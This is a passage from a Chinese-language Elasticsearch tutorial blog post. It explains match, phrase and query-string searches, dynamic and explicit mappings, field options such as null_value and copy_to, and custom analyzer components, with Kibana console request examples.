class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script_fields"</span>: &#123;</span><br><span class="line">    <span class="attr">"new_field"</span>: &#123;</span><br><span class="line">      <span class="attr">"script"</span>: &#123;</span><br><span class="line">        <span class="attr">"lang"</span>: <span class="string">"painless"</span>,</span><br><span class="line">        <span class="attr">"source"</span>: <span class="string">"doc['order_date'].value+'hello'"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用查询表达式-Match"><a href="#使用查询表达式-Match" class="headerlink" title="使用查询表达式 - Match"></a>使用查询表达式 - Match</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Last Christmas"</span>  <span class="comment">// 相当于 OR 可出现其中1个</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Last Christmas"</span>,</span><br><span class="line">        <span class="attr">"operator"</span>: <span class="string">"AND"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="短语搜索-Match-Phrase"><a href="#短语搜索-Match-Phrase" class="headerlink" title="短语搜索 - Match Phrase"></a>短语搜索 - Match Phrase</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"one love"</span>,</span><br><span class="line">        <span class="attr">"slop"</span>: <span class="number">1</span> <span class="comment">//中间可以有一个其他词</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Query-String-amp-Simple-Query-String"><a href="#Query-String-amp-Simple-Query-String" class="headerlink" title="Query String &amp; Simple Query String"></a>Query String &amp; Simple Query String</h2><h3 id="Query-String-Query"><a href="#Query-String-Query" class="headerlink" title="Query String Query"></a>Query String Query</h3><ul><li>类似 URI Query – 把查询条件放在 POST 里面</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 准备工作</span></span><br><span class="line">PUT /users/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"Richard Xin"</span>,</span><br><span class="line">  <span class="attr">"about"</span>:<span class="string">"java, golang, node, swift, elasticsearch"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /users/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"Richard Li"</span>,</span><br><span class="line">  <span class="attr">"about"</span>:<span class="string">"Hadoop"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//query_string</span></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"default_field"</span>: <span class="string">"name"</span>,</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"Richard AND Xin"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//query string 支持分组查询多个字段</span></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"fields"</span>:[<span class="string">"name"</span>,<span class="string">"about"</span>],</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"(Richard AND Xin) OR (Java AND Elasticsearch)"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Simple-Query-String-Query"><a href="#Simple-Query-String-Query" class="headerlink" title="Simple Query String Query"></a>Simple Query String Query</h3><ul><li>类似 Query String , 但是会忽略错误的语法同时只支持部分查询语句</li><li>不支持 AND OR NOT , 但会当作字符串处理</li><li>Term 之间默认的关系是 OR, 可以指定 Operator</li><li>支持 部分逻辑<ul><li>+ 替代 AND</li><li>| 替代 OR</li><li>- 替代 NOT</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Simple Query 默认的operator是 Or</span></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"simple_query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"Richard AND Xin"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"name"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"simple_query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"Richard Xin"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"name"</span>],</span><br><span class="line">      <span class="attr">"default_operator"</span>: <span class="string">"AND"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dynamic-Mapping-和常见字段类型"><a href="#Dynamic-Mapping-和常见字段类型" class="headerlink" title="Dynamic Mapping 和常见字段类型"></a>Dynamic Mapping 和常见字段类型</h2><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><ul><li>Mapping 类似数据库的 schema 的定义，作用如下<ul><li>定义索引中的字段名称</li><li>定义字段的数据类型，例如字符串，数字，布尔……</li><li>字段，倒排索引的相关配置，(Analyzed or Not Analyzed, Analyzer)</li></ul></li><li>Mapping 会把 JSON 文档映射成 Lucene 所需的扁平格式<ul><li>一个 Mapping 属于一个索引的 Type</li><li>每个文档都属于一个 Type</li><li>一个 Type 有一个 Mapping 定义</li><li>7.0 开始，不需要在 Mapping 定义指定 type 信息</li></ul></li></ul><h3 id="字段的数据类型"><a href="#字段的数据类型" class="headerlink" title="字段的数据类型"></a>字段的数据类型</h3><ul><li>简单类型<ul><li>Text / Keyword</li><li>Date</li><li>Integer / Floating</li><li>Boolean</li><li>IPv4 &amp; IPv6</li></ul></li><li>复杂类型 - 对象和嵌套对象<ul><li>对象类型 / 嵌套类型</li></ul></li><li>特殊类型<ul><li>geo_point &amp; geo_shape / percolator</li></ul></li></ul><h3 id="Dynamic-Mapping"><a href="#Dynamic-Mapping" class="headerlink" title="Dynamic Mapping"></a>Dynamic Mapping</h3><ul><li>在写入文档时候，如果索引不存在，会自动创建索引</li><li>Dynamic Mapping 的机制，使得我们无需手动定义Mappings。 Elasticsearch 会自动根据文档信息，推算出字段的类型</li><li>但是有时候会推算的不对，例如地理位置信息</li><li>当类型如果设置不对时，会导致一些功能无法正常运行，例如 Range 查询</li></ul><p><img src="/images/big-data/es-03/27.jpg" alt="27"></p><h3 id="类型的自动识别"><a href="#类型的自动识别" class="headerlink" title="类型的自动识别"></a>类型的自动识别</h3><table><thead><tr><th align="left">JSON 类型</th><th align="left">Elasticsearch 类型</th></tr></thead><tbody><tr><td align="left">字符串</td><td align="left">1. 匹配日期格式设置成 Date</td></tr><tr><td align="left"></td><td align="left">2. 设置数字设置为 float 或者 long，该选项默认关闭</td></tr><tr><td align="left"></td><td align="left">3. 设置为 Text, 并增加 keyword 子字段</td></tr><tr><td align="left">布尔值</td><td align="left">boolean</td></tr><tr><td align="left">浮点数</td><td align="left">float</td></tr><tr><td align="left">整数</td><td align="left">long</td></tr><tr><td align="left">对象</td><td align="left">Object</td></tr><tr><td align="left">数组</td><td align="left">由第一个非空数值的类型所决定</td></tr><tr><td align="left">空值</td><td align="left">忽略</td></tr></tbody></table><h3 id="能否更改-Mapping-的字段类型"><a href="#能否更改-Mapping-的字段类型" class="headerlink" title="能否更改 Mapping 的字段类型"></a>能否更改 Mapping 的字段类型</h3><ul><li>两种情况<ul><li>新增字段<ul><li>Dynamic 设置为 true 时，一定有新增字段的文档写入，Mapping 也同时被更新</li><li>Dynamic 设为 false，Mapping 不会被更新，自增字段的数据无法被索引，但是信息会出现在_source 中</li><li>Dynamic 设置成 Strict 文档写入失败</li></ul></li><li>对已有字段，一旦已经有数据写入，就不在支持修改字段定义<ul><li>Luene 实现的倒排索引，一旦生成后，就不允许修改</li><li>如果希望改变字段类型，必须 Reindex API，重建索引</li></ul></li></ul></li><li>原因<ul><li>如果修改了字段的数据类型，会导致已被索引的属于无法被搜索</li><li>但是如果是增加新的字段，就不会有这样的影响</li></ul></li></ul><h3 id="控制-Dynamic-Mappings"><a href="#控制-Dynamic-Mappings" class="headerlink" title="控制 Dynamic Mappings"></a>控制 Dynamic Mappings</h3><p><img src="/images/big-data/es-03/28.jpg" alt="28"></p><ul><li>当 dynamic 被设置成 false 时候，存在新增字段的数据写入，该数据可以被索引，当时新增字段被废弃</li><li>当设置成 Strict 模式的时候，数据写入直接出错</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认Mapping支持dynamic，写入的文档加入新的字段</span></span><br><span class="line">PUT dynamic_mapping_test/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"newField"</span>:<span class="string">"someValue"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//能被搜索到</span></span><br><span class="line">POST dynamic_mapping_test/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"newField"</span>: <span class="string">"someValue"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改为dynamic false</span></span><br><span class="line">PUT dynamic_mapping_test/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"dynamic"</span>:<span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新增anotherField 成功</span></span><br><span class="line">PUT dynamic_mapping_test/_doc/10</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"anotherField"</span>:<span class="string">"someValue"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重新去查询，但是anotherField 未被搜索到</span></span><br><span class="line">POST dynamic_mapping_test/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"newField"</span>: <span class="string">"someValue"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查看mapping</span></span><br><span class="line">GET dynamic_mapping_test/_mapping</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改为dynamic strict</span></span><br><span class="line">PUT dynamic_mapping_test/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"dynamic"</span>: <span class="string">"strict"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新增newField 报错</span></span><br><span class="line">PUT dynamic_mapping_test/_doc/12</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"newField"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>PS: Mapping中的字段一旦设定后，禁止直接修改。因为倒排索引生成后不允许直接修改。需要重新建立新的索引，做reindex操作，修改之前的数据的参数值 还是可以的.</p></blockquote><h2 id="显示-Mapping-设置与常见参数"><a href="#显示-Mapping-设置与常见参数" class="headerlink" title="显示 Mapping 设置与常见参数"></a>显示 Mapping 设置与常见参数</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT movies</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="comment">// define your mappings here</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义-Mapping-的一些建议"><a href="#自定义-Mapping-的一些建议" class="headerlink" title="自定义 Mapping 的一些建议"></a>自定义 Mapping 的一些建议</h3><ul><li>可以参考 API 手册，纯手写</li><li>为了减少输入的工作量，减少出错率，依照以下步骤<ul><li>创建一个临时的 index，写入一些样本数据</li><li>通过访问 Mapping API 获得该临时文件的动态 Mapping 定义</li><li>修改后用，使用该配置创建的索引</li><li>删除临时索引</li></ul></li></ul><h3 id="控制当前字段是否被索引"><a href="#控制当前字段是否被索引" class="headerlink" title="控制当前字段是否被索引"></a>控制当前字段是否被索引</h3><ul><li>index - 控制当前字段是否被索引。默认为 true。如果设置成 false，该字段不可被搜索。</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PUT users</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">      <span class="attr">"firstName"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"lastName"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"mobile"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"index"</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Index-Options"><a href="#Index-Options" class="headerlink" title="Index Options"></a>Index Options</h3><ul><li>四种不同级别的 Index Options 配置，可以控制倒排索引记录的内容<ul><li>docs - 记录 doc id</li><li>freqs - 记录 doc id 和 term frequencies</li><li>positions - 记录 doc id / term frequencies / term position</li><li>offsets - doc id / term frequencies / term posistion / character offects</li></ul></li><li>Text 类型默认记录 postions，其他默认为 docs</li><li>记录内容越多，占用存储空间越大</li></ul><h3 id="null-value"><a href="#null-value" class="headerlink" title="null_value"></a>null_value</h3><ul><li>需要对 NULL 值实现搜索</li><li>只有 Keyword 类型支持设定 null_Value</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DELETE users</span><br><span class="line">PUT users</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">      <span class="attr">"firstName"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"lastName"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"mobile"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"keyword"</span>,  <span class="comment">// 这个如果是text 无法设置为空</span></span><br><span class="line">        <span class="attr">"null_value"</span>: <span class="string">"NULL"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT users/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"firstName"</span>:<span class="string">"Richard"</span>,</span><br><span class="line">  <span class="attr">"lastName"</span>: <span class="string">"Xin"</span>,</span><br><span class="line">  <span class="attr">"mobile"</span>: <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT users/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"firstName"</span>:<span class="string">"Richard2"</span>,</span><br><span class="line">  <span class="attr">"lastName"</span>: <span class="string">"Xin2"</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"mobile"</span>:<span class="string">"NULL"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="copy-to"><a href="#copy-to" class="headerlink" title="copy_to"></a>copy_to</h3><ul><li>_all 在 7 中已经被 copy_to 所替代</li><li>满足一些特定的搜索需求</li><li>copy_to 将字段的数值拷贝到目标字段，实现类似 _all 的作用</li><li>copy_to 的目标字段不出现在 _source 中</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">DELETE users</span><br><span class="line">PUT users</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"firstName"</span>:&#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"copy_to"</span>: <span class="string">"fullName"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"lastName"</span>:&#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"copy_to"</span>: <span class="string">"fullName"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT users/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"firstName"</span>:<span class="string">"Richard"</span>,</span><br><span class="line">  <span class="attr">"lastName"</span>: <span class="string">"Xin"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET users/_search?q=fullName:(Richard Xin)</span><br><span class="line"></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">       <span class="attr">"fullName"</span>:&#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Richard Xin"</span>,</span><br><span class="line">        <span class="attr">"operator"</span>: <span class="string">"and"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><ul><li>Elasticsearch 中不提供专门的数组类型。但是任何字段，都可以包含多个相同类型的数值</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PUT users/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"onebird"</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"reading"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT users/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"twobirds"</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:[<span class="string">"reading"</span>,<span class="string">"music"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET users/_mapping</span><br></pre></td></tr></table></figure><blockquote><p>PS: text 类型会使用默认分词器分词，当然你也可以为他指定特定的分词器。如果定义成 keyword 类型，那么默认就不会对其进行分词。<br>ES 对字符串类型的 mapping 设定，会将其定义成 text，同时为他定义一个叫做 keyword 的子字段。keyword 只是他的名字，你也可以定义成 kw。这个字段的类型是 keyword（这是一个类型的关键字）<br>多字段类型情况下，你可以查询 title，也可以查询 title.keyword 查询类型为 keyword 的子字段</p></blockquote><h2 id="多字段特性及-Mapping-中配置自定义-Analyzer"><a href="#多字段特性及-Mapping-中配置自定义-Analyzer" class="headerlink" title="多字段特性及 Mapping 中配置自定义 Analyzer"></a>多字段特性及 Mapping 中配置自定义 Analyzer</h2><h3 id="多字段类型"><a href="#多字段类型" class="headerlink" title="多字段类型"></a>多字段类型</h3><ul><li>多字段特性<ul><li>厂家名字实现精确匹配<ul><li>增加一个 keyword 字段</li></ul></li><li>使用不同的 analyzer<ul><li>不同语言</li><li>pinyin 字段的搜索</li><li>还支持为搜索和索引指定不同的 analyzer</li></ul></li></ul></li></ul><p><img src="/images/big-data/es-03/29.jpg" alt="29"></p><h3 id="Excat-values-v-s-Full-Text"><a href="#Excat-values-v-s-Full-Text" class="headerlink" title="Excat values v.s Full Text"></a>Excat values v.s Full Text</h3><ul><li>Excat Values ：包括数字 / 日期 / 具体一个字符串 （例如 “Apple Store”）<ul><li>Elasticsearch 中的 keyword</li></ul></li><li>全文本，非结构化的文本数据<ul><li>Elasticsearch 中的 text</li></ul></li></ul><p><img src="/images/big-data/es-03/30.jpg" alt="30"></p><h3 id="Excat-values-不需要被分词"><a href="#Excat-values-不需要被分词" class="headerlink" title="Excat values 不需要被分词"></a>Excat values 不需要被分词</h3><ul><li>Elaticsearch 为每一个字段创建一个倒排索引<ul><li>Exact Value 在索引时，不需要做特殊的分词处理</li></ul></li></ul><p><img src="/images/big-data/es-03/31.jpg" alt="31"></p><h3 id="自定义分词"><a href="#自定义分词" class="headerlink" title="自定义分词"></a>自定义分词</h3><ul><li>当 Elasticsearch 自带的分词器无法满足时，可以自定义分词器。通过自组合不同的组件实现<ul><li>Character Filter</li><li>Tokenizer</li><li>Token Filter</li></ul></li></ul><h3 id="Character-Filters"><a href="#Character-Filters" class="headerlink" title="Character Filters"></a>Character Filters</h3><ul><li>在 Tokenizer 之前对文本进行处理，例如增加删除及替换字符。可以配置多个 Character Filters。会影响 Tokenizer 的 position 和 offset 信息</li><li>一些自带的 Character Filters<ul><li>HTML strip - 去除 html 标签</li><li>Mapping - 字符串替换</li><li>Pattern replace - 正则匹配替换</li></ul></li></ul><h3 id="Tokenizer"><a href="#Tokenizer" class="headerlink" title="Tokenizer"></a>Tokenizer</h3><ul><li>将原始的文本按照一定的规则，切分为词（term or token）</li><li>Elasticsearch 内置的 Tokenizers<ul><li>whitespace | standard | uax_url_email | pattern | keyword | path hierarchy</li></ul></li><li>可以用 JAVA 开发插件，实现自己的 Tokenizer</li></ul><h3 id="Token-Filters"><a href="#Token-Filters" class="headerlink" title="Token Filters"></a>Token Filters</h3><ul><li>将 Tokenizer 输出的单词，进行增加、修改、删除</li><li>自带的 Token Filters<ul><li>Lowercase | stop | synonym（添加近义词）</li></ul></li></ul><h3 id="Demo-char-filter"><a href="#Demo-char-filter" class="headerlink" title="Demo char_filter"></a>Demo 